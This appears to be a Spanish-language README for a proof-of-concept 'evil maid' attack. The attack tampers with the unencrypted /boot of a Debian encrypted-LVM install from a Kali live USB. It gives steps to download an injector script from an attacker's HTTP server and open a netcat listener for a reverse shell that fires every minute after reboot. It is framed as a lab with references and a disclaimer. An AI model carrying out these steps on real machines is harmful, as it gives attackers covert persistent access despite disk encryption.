# EvilMaid en Linux

POC para ejecutar un ataque evil maid a un sistema con Debian en el archivo init.

No es necesario guardar contraseñas, ni engañar al usuario.
Esto es posible dado que si se instala el sistema con "Encrypted LVM" no se encripta la partición de /boot

## Requisitos

- Un USB o archivo de disco con una distribución de Linux en LiveCD como Kali.
- Un sistema que puedas encriptar normalmente el disco y que no encripte /boot,
  ejemplo Debian con la opción de "Guided installation with encrypted LVM"
- vMWare Fusion, VirtualBox, UTM o cualquier virtualizador si se desea hacer un lab.

## Pasos

1. Instalar Debian con la opción de "Guided installation with encrypted LVM".
   En este caso utilice https://cdimage.debian.org/mirror/cdimage/archive/11.1.0/arm64/iso-cd/
   lo utilice en arm64 porque se realizo en una computadora con Apple Silicon.
2. Descargar y flashear el LiveCD de Kali Linux en un USB o dejar el disco en la computadora si se virtualiza.
   Kali: https://www.kali.org/get-kali/#kali-live
   Flasheo: https://etcher.balena.io/
3. Después de haber configurado Debian, apagar y bootear desde Kali,
   mediante la asignación del iso de Kali en el CD/DVD de vMWare Fusion.
   Iniciar desde firmware el VM y bootear desde el CD.
4. Pasar él `em_shell_injector.sh` desde alguna computadora o servidor web hacia el live cd

```
# Servidor de archivos en macOS de atacante
python3 -m http.server 80

# Traer los archivos desde el Live CD
curl http://IP/em_shell_injector.sh -o em_shell_injector.sh
```

5. Ejecutar el script en el Live CD de Kali

```
chmod +x em_shell_injector.sh
./em_shell_injector.sh
```

6. Abrir un puerto en la máquina atacante para recibir el reverse shell

```
nc -lv 4242
```

7. Bootear nuevamente la VM y entrar normalmente.
   Debera ejecutarse el script cada minuto
   y el reverse shell debería haberse realizado.

Referencias:
- https://debugging.works/blog/evil-maid-attack/
- https://www.cron.dk/evil-maid-encrypt-your-harddrive/
- https://github.com/x821938/Evil-Maid-POC
- https://github.com/AonCyberLabs/EvilAbigail
- https://github.com/robertchrk/evilmaid
- https://github.com/kmille/evil-maid-attack-on-encrypted-boot
- https://twopointfouristan.wordpress.com/2011/04/17/pwning-past-whole-disk-encryption/
- https://www.wzdftpd.net/blog/implementing-the-evil-maid-attack-on-linux-with-luks.html
- https://debugging.works/blog/your-fde-is-useless/
- https://github.com/curtishoughton/Penetration-Testing-Cheat-Sheet/blob/master/File-Transfer/readme.md
- https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

# Disclaimer

Este código es solo para fines educativos y de investigación. No se debe utilizar para actividades ilegales o no éticas.
El uso indebido de este código puede resultar en consecuencias legales.
El autor no se hace responsable de ningún daño o pérdida que pueda resultar del uso de este código.
```